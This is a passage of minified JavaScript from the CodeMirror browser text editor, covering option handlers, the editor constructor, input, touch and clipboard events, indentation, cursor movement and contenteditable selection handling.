y=[],w=c.doc.first;c.doc.iter(function(D){for(var I=0;;){var W=D.text.indexOf(p,I);if(W==-1)break;I=W+p.length,y.push(ve(w,W))}w++});for(var S=y.length-1;S>=0;S--)Os(c.doc,p,y[S],ve(y[S].line,y[S].ch+p.length))}}),d("specialChars",/[\u0000-\u001f\u007f-\u009f\u00ad\u061c\u200b\u200e\u200f\u2028\u2029\u202d\u202e\u2066\u2067\u2069\ufeff\ufff9-\ufffc]/g,function(c,p,y){c.state.specialChars=new RegExp(p.source+(p.test("	")?"":"|	"),"g"),y!=Hs&&c.refresh()}),d("specialCharPlaceholder",fS,function(c){return c.refresh()},!0),d("electricChars",!0),d("inputStyle",_?"contenteditable":"textarea",function(){throw new Error("inputStyle can not (yet) be changed in a running editor")},!0),d("spellcheck",!1,function(c,p){return c.getInputField().spellcheck=p},!0),d("autocorrect",!1,function(c,p){return c.getInputField().autocorrect=p},!0),d("autocapitalize",!1,function(c,p){return c.getInputField().autocapitalize=p},!0),d("rtlMoveVisually",!B),d("wholeLineUpdateBefore",!0),d("theme","default",function(c){Ey(c),oo(c)},!0),d("keyMap","default",function(c,p,y){var w=Oc(p),S=y!=Hs&&Oc(y);S&&S.detach&&S.detach(c,w),w.attach&&w.attach(c,S||null)}),d("extraKeys",null),d("configureMouse",null),d("lineWrapping",!1,BN,!0),d("gutters",[],function(c,p){c.display.gutterSpecs=ap(p,c.options.lineNumbers),oo(c)},!0),d("fixedGutter",!0,function(c,p){c.display.gutters.style.left=p?Vh(c.display)+"px":"0",c.refresh()},!0),d("coverGutterNextToScrollbar",!1,function(c){return Is(c)},!0),d("scrollbarStyle","native",function(c){T1(c),Is(c),c.display.scrollbars.setScrollTop(c.doc.scrollTop),c.display.scrollbars.setScrollLeft(c.doc.scrollLeft)},!0),d("lineNumbers",!1,function(c,p){c.display.gutterSpecs=ap(c.options.gutters,p),oo(c)},!0),d("firstLineNumber",1,oo,!0),d("lineNumberFormatter",function(c){return c},oo,!0),d("showCursorWhenSelecting",!1,no,!0),d("resetSelectionOnContextMenu",!0),d("lineWiseCopyCut",!0),d("pasteLinesPerSelection",!0),d("selectionsMayTouch",!1),d("readOnly",!1,function(c,p){p=="nocursor"&&(Ls(c),c.display.input.blur()),c.display.input.readOnlyChanged(p)}),d("screenReaderLabel",null,function(c,p){p=p===""?null:p,c.display.input.screenReaderLabelChanged(p)}),d("disableInput",!1,function(c,p){p||c.display.input.reset()},!0),d("dragDrop",!0,MN),d("allowDropFileTypes",null),d("cursorBlinkRate",530),d("cursorScrollMargin",0),d("cursorHeight",1,no,!0),d("singleCursorHeightPerLine",!0,no,!0),d("workTime",100),d("workDelay",100),d("flattenSpans",!0,uo,!0),d("addModeClass",!1,uo,!0),d("pollInterval",100),d("undoDepth",200,function(c,p){return c.doc.history.undoDepth=p}),d("historyEventDelay",1250),d("viewportMargin",10,function(c){return c.refresh()},!0),d("maxHighlightLength",1e4,uo,!0),d("moveInputWithCursor",!0,function(c,p){p||c.display.input.resetPosition()}),d("tabindex",null,function(c,p){return c.display.input.getField().tabIndex=p||""}),d("autofocus",null),d("direction","ltr",function(c,p){return c.doc.setDirection(p)},!0),d("phrases",null)}function MN(i,s,d){var c=d&&d!=Hs;if(!s!=!c){var p=i.display.dragFunctions,y=s?fe:gt;y(i.display.scroller,"dragstart",p.start),y(i.display.scroller,"dragenter",p.enter),y(i.display.scroller,"dragover",p.over),y(i.display.scroller,"dragleave",p.leave),y(i.display.scroller,"drop",p.drop)}}function BN(i){i.options.lineWrapping?(q(i.display.wrapper,"CodeMirror-wrap"),i.display.sizer.style.minWidth="",i.display.sizerWidth=null):(Z(i.display.wrapper,"CodeMirror-wrap"),Fh(i)),Gh(i),qn(i),to(i),setTimeout(function(){return Is(i)},100)}function Pt(i,s){var d=this;if(!(this instanceof Pt))return new Pt(i,s);this.options=s=s?vt(s):{},vt(wy,s,!1);var c=s.value;typeof c=="string"?c=new $n(c,s.mode,null,s.lineSeparator,s.direction):s.mode&&(c.modeOption=s.mode),this.doc=c;var p=new Pt.inputStyles[s.inputStyle](this),y=this.display=new ZS(i,c,p,s);y.wrapper.CodeMirror=this,Ey(this),s.lineWrapping&&(this.display.wrapper.className+=" CodeMirror-wrap"),T1(this),this.state={keyMaps:[],overlays:[],modeGen:0,overwrite:!1,delayingBlurEvent:!1,focused:!1,suppressEdits:!1,pasteIncoming:-1,cutIncoming:-1,selectingText:!1,draggingText:!1,highlight:new Tt,keySeq:null,specialChars:null},s.autofocus&&!_&&y.input.focus(),h&&m<11&&setTimeout(function(){return d.display.input.reset(!0)},20),HN(this),xN(),$a(this),this.curOp.forceUpdate=!0,j1(this,c),s.autofocus&&!_||this.hasFocus()?setTimeout(function(){d.hasFocus()&&!d.state.focused&&Zh(d)},20):Ls(this);for(var w in Mc)Mc.hasOwnProperty(w)&&Mc[w](this,s[w],Hs);N1(this),s.finishInit&&s.finishInit(this);for(var S=0;S<yp.length;++S)yp[S](this);Ya(this),x&&s.lineWrapping&&getComputedStyle(y.lineDiv).textRendering=="optimizelegibility"&&(y.lineDiv.style.textRendering="auto")}Pt.defaults=wy,Pt.optionHandlers=Mc;function HN(i){var s=i.display;fe(s.scroller,"mousedown",cn(i,xy)),h&&m<11?fe(s.scroller,"dblclick",cn(i,function(D){if(!tt(i,D)){var I=Ua(i,D);if(!(!I||xp(i,D)||yi(i.display,D))){Bt(D);var W=i.findWordAt(I);_c(i.doc,W.anchor,W.head)}}})):fe(s.scroller,"dblclick",function(D){return tt(i,D)||Bt(D)}),fe(s.scroller,"contextmenu",function(D){return by(i,D)}),fe(s.input.getField(),"contextmenu",function(D){s.scroller.contains(D.target)||by(i,D)});var d,c={end:0};function p(){s.activeTouch&&(d=setTimeout(function(){return s.activeTouch=null},1e3),c=s.activeTouch,c.end=+new Date)}function y(D){if(D.touches.length!=1)return!1;var I=D.touches[0];return I.radiusX<=1&&I.radiusY<=1}function w(D,I){if(I.left==null)return!0;var W=I.left-D.left,K=I.top-D.top;return W*W+K*K>20*20}fe(s.scroller,"touchstart",function(D){if(!tt(i,D)&&!y(D)&&!xp(i,D)){s.input.ensurePolled(),clearTimeout(d);var I=+new Date;s.activeTouch={start:I,moved:!1,prev:I-c.end<=300?c:null},D.touches.length==1&&(s.activeTouch.left=D.touches[0].pageX,s.activeTouch.top=D.touches[0].pageY)}}),fe(s.scroller,"touchmove",function(){s.activeTouch&&(s.activeTouch.moved=!0)}),fe(s.scroller,"touchend",function(D){var I=s.activeTouch;if(I&&!yi(s,D)&&I.left!=null&&!I.moved&&new Date-I.start<300){var W=i.coordsChar(s.activeTouch,"page"),K;!I.prev||w(I,I.prev)?K=new yt(W,W):!I.prev.prev||w(I,I.prev.prev)?K=i.findWordAt(W):K=new yt(ve(W.line,0),Je(i.doc,ve(W.line+1,0))),i.setSelection(K.anchor,K.head),i.focus(),Bt(D)}p()}),fe(s.scroller,"touchcancel",p),fe(s.scroller,"scroll",function(){s.scroller.clientHeight&&(io(i,s.scroller.scrollTop),Wa(i,s.scroller.scrollLeft,!0),xt(i,"scroll",i))}),fe(s.scroller,"mousewheel",function(D){return L1(i,D)}),fe(s.scroller,"DOMMouseScroll",function(D){return L1(i,D)}),fe(s.wrapper,"scroll",function(){return s.wrapper.scrollTop=s.wrapper.scrollLeft=0}),s.dragFunctions={enter:function(D){tt(i,D)||Mr(D)},over:function(D){tt(i,D)||(gN(i,D),Mr(D))},start:function(D){return mN(i,D)},drop:cn(i,pN),leave:function(D){tt(i,D)||iy(i)}};var S=s.input.getField();fe(S,"keyup",function(D){return my.call(i,D)}),fe(S,"keydown",cn(i,py)),fe(S,"keypress",cn(i,gy)),fe(S,"focus",function(D){return Zh(i,D)}),fe(S,"blur",function(D){return Ls(i,D)})}var yp=[];Pt.defineInitHook=function(i){return yp.push(i)};function ko(i,s,d,c){var p=i.doc,y;d==null&&(d="add"),d=="smart"&&(p.mode.indent?y=Kl(i,s).state:d="prev");var w=i.options.tabSize,S=Ye(p,s),D=lt(S.text,null,w);S.stateAfter&&(S.stateAfter=null);var I=S.text.match(/^\s*/)[0],W;if(!c&&!/\S/.test(S.text))W=0,d="not";else if(d=="smart"&&(W=p.mode.indent(y,S.text.slice(I.length),S.text),W==Mt||W>150)){if(!c)return;d="prev"}d=="prev"?s>p.first?W=lt(Ye(p,s-1).text,null,w):W=0:d=="add"?W=D+i.options.indentUnit:d=="subtract"?W=D-i.options.indentUnit:typeof d=="number"&&(W=D+d),W=Math.max(0,W);var K="",ie=0;if(i.options.indentWithTabs)for(var re=Math.floor(W/w);re;--re)ie+=w,K+="	";if(ie<W&&(K+=fr(W-ie)),K!=I)return Os(p,K,ve(s,0),ve(s,I.length),"+input"),S.stateAfter=null,!0;for(var de=0;de<p.sel.ranges.length;de++){var ge=p.sel.ranges[de];if(ge.head.line==s&&ge.head.ch<I.length){var ke=ve(s,I.length);dp(p,de,new yt(ke,ke));break}}}var zr=null;function Bc(i){zr=i}function vp(i,s,d,c,p){var y=i.doc;i.display.shift=!1,c||(c=y.sel);var w=+new Date-200,S=p=="paste"||i.state.pasteIncoming>w,D=wh(s),I=null;if(S&&c.ranges.length>1)if(zr&&zr.text.join(`
`)==s){if(c.ranges.length%zr.text.length==0){I=[];for(var W=0;W<zr.text.length;W++)I.push(y.splitLines(zr.text[W]))}}else D.length==c.ranges.length&&i.options.pasteLinesPerSelection&&(I=Wn(D,function(Ie){return[Ie]}));for(var K=i.curOp.updateInput,ie=c.ranges.length-1;ie>=0;ie--){var re=c.ranges[ie],de=re.from(),ge=re.to();re.empty()&&(d&&d>0?de=ve(de.line,de.ch-d):i.state.overwrite&&!S?ge=ve(ge.line,Math.min(Ye(y,ge.line).text.length,ge.ch+it(D).length)):S&&zr&&zr.lineWise&&zr.text.join(`
`)==D.join(`
`)&&(de=ge=ve(de.line,0)));var ke={from:de,to:ge,text:I?I[ie%I.length]:D,origin:p||(S?"paste":i.state.cutIncoming>w?"cut":"+input")};Rs(i.doc,ke),un(i,"inputRead",i,ke)}s&&!S&&Ty(i,s),_s(i),i.curOp.updateInput<2&&(i.curOp.updateInput=K),i.curOp.typing=!0,i.state.pasteIncoming=i.state.cutIncoming=-1}function ky(i,s){var d=i.clipboardData&&i.clipboardData.getData("Text");if(d)return i.preventDefault(),!s.isReadOnly()&&!s.options.disableInput&&s.hasFocus()&&tr(s,function(){return vp(s,d,0,null,"paste")}),!0}function Ty(i,s){if(!(!i.options.electricChars||!i.options.smartIndent))for(var d=i.doc.sel,c=d.ranges.length-1;c>=0;c--){var p=d.ranges[c];if(!(p.head.ch>100||c&&d.ranges[c-1].head.line==p.head.line)){var y=i.getModeAt(p.head),w=!1;if(y.electricChars){for(var S=0;S<y.electricChars.length;S++)if(s.indexOf(y.electricChars.charAt(S))>-1){w=ko(i,p.head.line,"smart");break}}else y.electricInput&&y.electricInput.test(Ye(i.doc,p.head.line).text.slice(0,p.head.ch))&&(w=ko(i,p.head.line,"smart"));w&&un(i,"electricInput",i,p.head.line)}}}function Cy(i){for(var s=[],d=[],c=0;c<i.doc.sel.ranges.length;c++){var p=i.doc.sel.ranges[c].head.line,y={anchor:ve(p,0),head:ve(p+1,0)};d.push(y),s.push(i.getRange(y.anchor,y.head))}return{text:s,ranges:d}}function bp(i,s,d,c){i.setAttribute("autocorrect",d?"on":"off"),i.setAttribute("autocapitalize",c?"on":"off"),i.setAttribute("spellcheck",!!s)}function Sy(){var i=J("textarea",null,null,"position: absolute; bottom: -1em; padding: 0; width: 1px; height: 1em; min-height: 1em; outline: none"),s=J("div",[i],null,"overflow: hidden; position: relative; width: 3px; height: 0px;");return x?i.style.width="1000px":i.setAttribute("wrap","off"),T&&(i.style.border="1px solid black"),s}function UN(i){var s=i.optionHandlers,d=i.helpers={};i.prototype={constructor:i,focus:function(){De(this).focus(),this.display.input.focus()},setOption:function(c,p){var y=this.options,w=y[c];y[c]==p&&c!="mode"||(y[c]=p,s.hasOwnProperty(c)&&cn(this,s[c])(this,p,w),xt(this,"optionChange",this,c))},getOption:function(c){return this.options[c]},getDoc:function(){return this.doc},addKeyMap:function(c,p){this.state.keyMaps[p?"push":"unshift"](Oc(c))},removeKeyMap:function(c){for(var p=this.state.keyMaps,y=0;y<p.length;++y)if(p[y]==c||p[y].name==c)return p.splice(y,1),!0},addOverlay:_n(function(c,p){var y=c.token?c:i.getMode(this.options,c);if(y.startState)throw new Error("Overlays may not be stateful.");Tr(this.state.overlays,{mode:y,modeSpec:c,opaque:p&&p.opaque,priority:p&&p.priority||0},function(w){return w.priority}),this.state.modeGen++,qn(this)}),removeOverlay:_n(function(c){for(var p=this.state.overlays,y=0;y<p.length;++y){var w=p[y].modeSpec;if(w==c||typeof c=="string"&&w.name==c){p.splice(y,1),this.state.modeGen++,qn(this);return}}}),indentLine:_n(function(c,p,y){typeof p!="string"&&typeof p!="number"&&(p==null?p=this.options.smartIndent?"smart":"prev":p=p?"add":"subtract"),Ql(this.doc,c)&&ko(this,c,p,y)}),indentSelection:_n(function(c){for(var p=this.doc.sel.ranges,y=-1,w=0;w<p.length;w++){var S=p[w];if(S.empty())S.head.line>y&&(ko(this,S.head.line,c,!0),y=S.head.line,w==this.doc.sel.primIndex&&_s(this));else{var D=S.from(),I=S.to(),W=Math.max(y,D.line);y=Math.min(this.lastLine(),I.line-(I.ch?0:1))+1;for(var K=W;K<y;++K)ko(this,K,c);var ie=this.doc.sel.ranges;D.ch==0&&p.length==ie.length&&ie[w].from().ch>0&&dp(this.doc,w,new yt(D,ie[w].to()),nn)}}}),getTokenAt:function(c,p){return Ox(this,c,p)},getLineTokens:function(c,p){return Ox(this,ve(c),p,!0)},getTokenTypeAt:function(c){c=Je(this.doc,c);var p=Px(this,Ye(this.doc,c.line)),y=0,w=(p.length-1)/2,S=c.ch,D;if(S==0)D=p[2];else for(;;){var I=y+w>>1;if((I?p[I*2-1]:0)>=S)w=I;else if(p[I*2+1]<S)y=I+1;else{D=p[I*2+2];break}}var W=D?D.indexOf("overlay "):-1;return W<0?D:W==0?null:D.slice(0,W-1)},getModeAt:function(c){var p=this.doc.mode;return p.innerMode?i.innerMode(p,this.getTokenAt(c).state).mode:p},getHelper:function(c,p){return this.getHelpers(c,p)[0]},getHelpers:function(c,p){var y=[];if(!d.hasOwnProperty(p))return y;var w=d[p],S=this.getModeAt(c);if(typeof S[p]=="string")w[S[p]]&&y.push(w[S[p]]);else if(S[p])for(var D=0;D<S[p].length;D++){var I=w[S[p][D]];I&&y.push(I)}else S.helperType&&w[S.helperType]?y.push(w[S.helperType]):w[S.name]&&y.push(w[S.name]);for(var W=0;W<w._global.length;W++){var K=w._global[W];K.pred(S,this)&&ut(y,K.val)==-1&&y.push(K.val)}return y},getStateAfter:function(c,p){var y=this.doc;return c=Lx(y,c??y.first+y.size-1),Kl(this,c+1,p).state},cursorCoords:function(c,p){var y,w=this.doc.sel.primary();return c==null?y=w.head:typeof c=="object"?y=Je(this.doc,c):y=c?w.from():w.to(),Hr(this,y,p||"page")},charCoords:function(c,p){return Ec(this,Je(this.doc,c),p||"page")},coordsChar:function(c,p){return c=d1(this,c,p||"page"),qh(this,c.left,c.top)},lineAtHeight:function(c,p){return c=d1(this,{top:c,left:0},p||"page").top,Ma(this.doc,c+this.display.viewOffset)},heightAtLine:function(c,p,y){var w=!1,S;if(typeof c=="number"){var D=this.doc.first+this.doc.size-1;c<this.doc.first?c=this.doc.first:c>D&&(c=D,w=!0),S=Ye(this.doc,c)}else S=c;return bc(this,S,{top:0,left:0},p||"page",y||w).top+(w?this.doc.height-xi(S):0)},defaultTextHeight:function(){return As(this.display)},defaultCharWidth:function(){return Ds(this.display)},getViewport:function(){return{from:this.display.viewFrom,to:this.display.viewTo}},addWidget:function(c,p,y,w,S){var D=this.display;c=Hr(this,Je(this.doc,c));var I=c.bottom,W=c.left;if(p.style.position="absolute",p.setAttribute("cm-ignore-events","true"),this.display.input.setUneditable(p),D.sizer.appendChild(p),w=="over")I=c.top;else if(w=="above"||w=="near"){var K=Math.max(D.wrapper.clientHeight,this.doc.height),ie=Math.max(D.sizer.clientWidth,D.lineSpace.clientWidth);(w=="above"||c.bottom+p.offsetHeight>K)&&c.top>p.offsetHeight?I=c.top-p.offsetHeight:c.bottom+p.offsetHeight<=K&&(I=c.bottom),W+p.offsetWidth>ie&&(W=ie-p.offsetWidth)}p.style.top=I+"px",p.style.left=p.style.right="",S=="right"?(W=D.sizer.clientWidth-p.offsetWidth,p.style.right="0px"):(S=="left"?W=0:S=="middle"&&(W=(D.sizer.clientWidth-p.offsetWidth)/2),p.style.left=W+"px"),y&&MS(this,{left:W,top:I,right:W+p.offsetWidth,bottom:I+p.offsetHeight})},triggerOnKeyDown:_n(py),triggerOnKeyPress:_n(gy),triggerOnKeyUp:my,triggerOnMouseDown:_n(xy),execCommand:function(c){if(vo.hasOwnProperty(c))return vo[c].call(null,this)},triggerElectric:_n(function(c){Ty(this,c)}),findPosH:function(c,p,y,w){var S=1;p<0&&(S=-1,p=-p);for(var D=Je(this.doc,c),I=0;I<p&&(D=Ep(this.doc,D,S,y,w),!D.hitSide);++I);return D},moveH:_n(function(c,p){var y=this;this.extendSelectionsBy(function(w){return y.display.shift||y.doc.extend||w.empty()?Ep(y.doc,w.head,c,p,y.options.rtlMoveVisually):c<0?w.from():w.to()},Hn)}),deleteH:_n(function(c,p){var y=this.doc.sel,w=this.doc;y.somethingSelected()?w.replaceSelection("",null,"+delete"):Bs(this,function(S){var D=Ep(w,S.head,c,p,!1);return c<0?{from:D,to:S.head}:{from:S.head,to:D}})}),findPosV:function(c,p,y,w){var S=1,D=w;p<0&&(S=-1,p=-p);for(var I=Je(this.doc,c),W=0;W<p;++W){var K=Hr(this,I,"div");if(D==null?D=K.left:K.left=D,I=Ny(this,K,S,y),I.hitSide)break}return I},moveV:_n(function(c,p){var y=this,w=this.doc,S=[],D=!this.display.shift&&!w.extend&&w.sel.somethingSelected();if(w.extendSelectionsBy(function(W){if(D)return c<0?W.from():W.to();var K=Hr(y,W.head,"div");W.goalColumn!=null&&(K.left=W.goalColumn),S.push(K.left);var ie=Ny(y,K,c,p);return p=="page"&&W==w.sel.primary()&&ep(y,Ec(y,ie,"div").top-K.top),ie},Hn),S.length)for(var I=0;I<w.sel.ranges.length;I++)w.sel.ranges[I].goalColumn=S[I]}),findWordAt:function(c){var p=this.doc,y=Ye(p,c.line).text,w=c.ch,S=c.ch;if(y){var D=this.getHelper(c,"wordChars");(c.sticky=="before"||S==y.length)&&w?--w:++S;for(var I=y.charAt(w),W=L(I,D)?function(K){return L(K,D)}:/\s/.test(I)?function(K){return/\s/.test(K)}:function(K){return!/\s/.test(K)&&!L(K)};w>0&&W(y.charAt(w-1));)--w;for(;S<y.length&&W(y.charAt(S));)++S}return new yt(ve(c.line,w),ve(c.line,S))},toggleOverwrite:function(c){c!=null&&c==this.state.overwrite||((this.state.overwrite=!this.state.overwrite)?q(this.display.cursorDiv,"CodeMirror-overwrite"):Z(this.display.cursorDiv,"CodeMirror-overwrite"),xt(this,"overwriteToggle",this,this.state.overwrite))},hasFocus:function(){return this.display.input.getField()==xe(se(this))},isReadOnly:function(){return!!(this.options.readOnly||this.doc.cantEdit)},scrollTo:_n(function(c,p){ro(this,c,p)}),getScrollInfo:function(){var c=this.display.scroller;return{left:c.scrollLeft,top:c.scrollTop,height:c.scrollHeight-ni(this)-this.display.barHeight,width:c.scrollWidth-ni(this)-this.display.barWidth,clientHeight:Hh(this),clientWidth:Ba(this)}},scrollIntoView:_n(function(c,p){c==null?(c={from:this.doc.sel.primary().head,to:null},p==null&&(p=this.options.cursorScrollMargin)):typeof c=="number"?c={from:ve(c,0),to:null}:c.from==null&&(c={from:c,to:null}),c.to||(c.to=c.from),c.margin=p||0,c.from.line!=null?BS(this,c):b1(this,c.from,c.to,c.margin)}),setSize:_n(function(c,p){var y=this,w=function(D){return typeof D=="number"||/^\d+$/.test(String(D))?D+"px":D};c!=null&&(this.display.wrapper.style.width=w(c)),p!=null&&(this.display.wrapper.style.height=w(p)),this.options.lineWrapping&&o1(this);var S=this.display.viewFrom;this.doc.iter(S,this.display.viewTo,function(D){if(D.widgets){for(var I=0;I<D.widgets.length;I++)if(D.widgets[I].noHScroll){Yi(y,S,"widget");break}}++S}),this.curOp.forceUpdate=!0,xt(this,"refresh",this)}),operation:function(c){return tr(this,c)},startOperation:function(){return $a(this)},endOperation:function(){return Ya(this)},refresh:_n(function(){var c=this.display.cachedTextHeight;qn(this),this.curOp.forceUpdate=!0,to(this),ro(this,this.doc.scrollLeft,this.doc.scrollTop),rp(this.display),(c==null||Math.abs(c-As(this.display))>.5||this.options.lineWrapping)&&Gh(this),xt(this,"refresh",this)}),swapDoc:_n(function(c){var p=this.doc;return p.cm=null,this.state.selectingText&&this.state.selectingText(),j1(this,c),to(this),this.display.input.reset(),ro(this,c.scrollLeft,c.scrollTop),this.curOp.forceScroll=!0,un(this,"swapDoc",this,p),p}),phrase:function(c){var p=this.options.phrases;return p&&Object.prototype.hasOwnProperty.call(p,c)?p[c]:c},getInputField:function(){return this.display.input.getField()},getWrapperElement:function(){return this.display.wrapper},getScrollerElement:function(){return this.display.scroller},getGutterElement:function(){return this.display.gutters}},Cr(i),i.registerHelper=function(c,p,y){d.hasOwnProperty(c)||(d[c]=i[c]={_global:[]}),d[c][p]=y},i.registerGlobalHelper=function(c,p,y,w){i.registerHelper(c,p,w),d[c]._global.push({pred:y,val:w})}}function Ep(i,s,d,c,p){var y=s,w=d,S=Ye(i,s.line),D=p&&i.direction=="rtl"?-d:d;function I(){var Oe=s.line+D;return Oe<i.first||Oe>=i.first+i.size?!1:(s=new ve(Oe,s.ch,s.sticky),S=Ye(i,Oe))}function W(Oe){var Pe;if(c=="codepoint"){var Me=S.text.charCodeAt(s.ch+(d>0?0:-1));if(isNaN(Me))Pe=null;else{var Qe=d>0?Me>=55296&&Me<56320:Me>=56320&&Me<57343;Pe=new ve(s.line,Math.max(0,Math.min(S.text.length,s.ch+d*(Qe?2:1))),-d)}}else p?Pe=wN(i.cm,S,s,d):Pe=hp(S,s,d);if(Pe==null)if(!Oe&&I())s=pp(p,i.cm,S,s.line,D);else return!1;else s=Pe;return!0}if(c=="char"||c=="codepoint")W();else if(c=="column")W(!0);else if(c=="word"||c=="group")for(var K=null,ie=c=="group",re=i.cm&&i.cm.getHelper(s,"wordChars"),de=!0;!(d<0&&!W(!de));de=!1){var ge=S.text.charAt(s.ch)||`
`,ke=L(ge,re)?"w":ie&&ge==`
`?"n":!ie||/\s/.test(ge)?null:"p";if(ie&&!de&&!ke&&(ke="s"),K&&K!=ke){d<0&&(d=1,W(),s.sticky="after");break}if(ke&&(K=ke),d>0&&!W(!de))break}var Ie=Pc(i,s,y,w,!0);return Dh(y,Ie)&&(Ie.hitSide=!0),Ie}function Ny(i,s,d,c){var p=i.doc,y=s.left,w;if(c=="page"){var S=Math.min(i.display.wrapper.clientHeight,De(i).innerHeight||p(i).documentElement.clientHeight),D=Math.max(S-.5*As(i.display),3);w=(d>0?s.bottom:s.top)+d*D}else c=="line"&&(w=d>0?s.bottom+3:s.top-3);for(var I;I=qh(i,y,w),!!I.outside;){if(d<0?w<=0:w>=p.height){I.hitSide=!0;break}w+=d*5}return I}var kt=function(i){this.cm=i,this.lastAnchorNode=this.lastAnchorOffset=this.lastFocusNode=this.lastFocusOffset=null,this.polling=new Tt,this.composing=null,this.gracePeriod=!1,this.readDOMTimeout=null};kt.prototype.init=function(i){var s=this,d=this,c=d.cm,p=d.div=i.lineDiv;p.contentEditable=!0,bp(p,c.options.spellcheck,c.options.autocorrect,c.options.autocapitalize);function y(S){for(var D=S.target;D;D=D.parentNode){if(D==p)return!0;if(/\bCodeMirror-(?:line)?widget\b/.test(D.className))break}return!1}fe(p,"paste",function(S){!y(S)||tt(c,S)||ky(S,c)||m<=11&&setTimeout(cn(c,function(){return s.updateFromDOM()}),20)}),fe(p,"compositionstart",function(S){s.composing={data:S.data,done:!1}}),fe(p,"compositionupdate",function(S){s.composing||(s.composing={data:S.data,done:!1})}),fe(p,"compositionend",function(S){s.composing&&(S.data!=s.composing.data&&s.readFromDOMSoon(),s.composing.done=!0)}),fe(p,"touchstart",function(){return d.forceCompositionEnd()}),fe(p,"input",function(){s.composing||s.readFromDOMSoon()});function w(S){if(!(!y(S)||tt(c,S))){if(c.somethingSelected())Bc({lineWise:!1,text:c.getSelections()}),S.type=="cut"&&c.replaceSelection("",null,"cut");else if(c.options.lineWiseCopyCut){var D=Cy(c);Bc({lineWise:!0,text:D.text}),S.type=="cut"&&c.operation(function(){c.setSelections(D.ranges,0,nn),c.replaceSelection("",null,"cut")})}else return;if(S.clipboardData){S.clipboardData.clearData();var I=zr.text.join(`
`);if(S.clipboardData.setData("Text",I),S.clipboardData.getData("Text")==I){S.preventDefault();return}}var W=Sy(),K=W.firstChild;bp(K),c.display.lineSpace.insertBefore(W,c.display.lineSpace.firstChild),K.value=zr.text.join(`
`);var ie=xe(Ve(p));Q(K),setTimeout(function(){c.display.lineSpace.removeChild(W),ie.focus(),ie==p&&d.showPrimarySelection()},50)}}fe(p,"copy",w),fe(p,"cut",w)},kt.prototype.screenReaderLabelChanged=function(i){i?this.div.setAttribute("aria-label",i):this.div.removeAttribute("aria-label")},kt.prototype.prepareSelection=function(){var i=x1(this.cm,!1);return i.focus=xe(Ve(this.div))==this.div,i},kt.prototype.showSelection=function(i,s){!i||!this.cm.display.view.length||((i.focus||s)&&this.showPrimarySelection(),this.showMultipleSelections(i))},kt.prototype.getSelection=function(){return this.cm.display.wrapper.ownerDocument.getSelection()},kt.prototype.showPrimarySelection=function(){var i=this.getSelection(),s=this.cm,d=s.doc.sel.primary(),c=d.from(),p=d.to();if(s.display.viewTo==s.display.viewFrom||c.line>=s.display.viewTo||p.line<s.display.viewFrom){i.removeAllRanges();return}var y=Hc(s,i.anchorNode,i.anchorOffset),w=Hc(s,i.focusNode,i.focusOffset);if(!(y&&!y.bad&&w&&!w.bad&&Ze(dc(y,w),c)==0&&Ze(cc(y,w),p)==0)){var S=s.display.view,D=c.line>=s.display.viewFrom&&Ay(s,c)||{node:S[0].measure.map[2],offset:0},I=p.line<s.display.viewTo&&Ay(s,p);if(!I){var W=S[S.length-1].measure,K=W.maps?W.maps[W.maps.length-1]:W.map;I={node:K[K.length-1],offset:K[K.length-2]-K[K.length-3]}}if(!D||!I){i.removeAllRanges();return}var ie=i.rangeCount&&i.getRangeAt(0),re;try{re=oe(D.node,D.offset,I.offset,I.node)}catch{}re&&(!a&&s.state.focused?(i.collapse(D.node,D.offset),re.collapsed||(i.removeAllRanges(),i.addRange(re))):(i.removeAllRanges(),i.addRange(re)),ie&&i.anchorNode==null?i.addRange(ie):a&&this.startGracePeriod()),this.rememberSelection()}},kt.prototype.startGracePeriod=function(){var i=this;clearTimeout(this.gracePeriod),this.gracePeriod=setTimeout(function(){i.gracePeriod=!1,i.selectionChanged()&&i.cm.operation(function(){return i.cm.curOp.selectionChanged=!0})},20)},kt.prototype.showMultipleSelections=function(i){ye(this.cm.display.cursorDiv,i.cursors),ye(this.cm.display.selectionDiv,i.selection)},kt.prototype.rememberSelection=function(){var i=this.getSelection();this.lastAnchorNode=i.anchorNode,this.lastAnchorOffset=i.anchorOffset,this.lastFocusNode=i.focusNode,this.lastFocusOffset=i.focusOffset},kt.prototype.selectionInEditor=function(){var i=this.getSelection();if(!i.rangeCount)return!1;var s=i.getRangeAt(0).commonAncestorContainer;return ae(this.div,s)},kt.prototype.focus=function(){this.cm.options.readOnly!="nocursor"&&((!this.selectionInEditor()||xe(Ve(this.div))!=this.div)&&this.showSelection(this.prepareSelection(),!0),this.div.focus())},kt.prototype.blur=function(){this.div.blur()},kt.prototype.getField=function(){return this.div},kt.prototype.supportsTouch=function(){return!0},kt.prototype.receivedFocus=function(){var i=this,s=this;this.selectionInEditor()?setTimeout(function(){return i.pollSelection()},20):tr(this.cm,function(){return s.cm.curOp.selectionChanged=!0});function d(){s.cm.state.focused&&(s.pollSelection(),s.polling.set(s.cm.options.pollInterval,d))}this.polling.set(this.cm.options.pollInterval,d)},kt.prototype.selectionChanged=function(){var i=this.getSelection();return i.anchorNode!=this.lastAnchorNode||i.anchorOffset!=this.lastAnchorOffset||i.focusNode!=this.lastFocusNode||i.focusOffset!=this.lastFocusOffset},kt.prototype.pollSelection=function(){if(!(this.readDOMTimeout!=null||this.gracePeriod||!this.selectionChanged())){var i=this.getSelection(),s=this.cm;if(A&&b&&this.cm.display.gutterSpecs.length&&zN(i.anchorNode)){this.cm.triggerOnKeyDown({type:"keydown",keyCode:8,preventDefault:Math.abs}),this.blur(),this.focus();return}if(!this.composing){this.rememberSelection();var d=Hc(s,i.anchorNode,i.anchorOffset),c=Hc(s,i.focusNode,i.focusOffset);d&&c&&tr(s,function(){Cn(s.doc,Gi(d,c),nn),(d.bad||c.bad)&&(s.curOp.selectionChanged=!0)})}}},kt.prototype.pollContent=function(){this.readDOMTimeout!=null&&(clearTimeout(this.readDOMTimeout),this.readDOMTimeout=null);var i=this.cm,s=i.display,d=i.doc.sel.primary(),c=d.from(),p=d.to();if(c.ch==0&&c.line>i.firstLine()&&(c=ve(c.line-1,Ye(i.doc,c.line-1).length)),p.ch==Ye(i.doc,p.line).text.length&&p.line<i.lastLine()&&(p=ve(p.line+1,0)),c.line<s.viewFrom||p.line>s.viewTo-1)return!1;var y,w,S;c.line==s.viewFrom||(y=za(i,c.line))==0?(w=wt(s.view[0].line),S=s.view[0].node):(w=wt(s.view[y].line),S=s.view[y-1].node.nextSibling);var 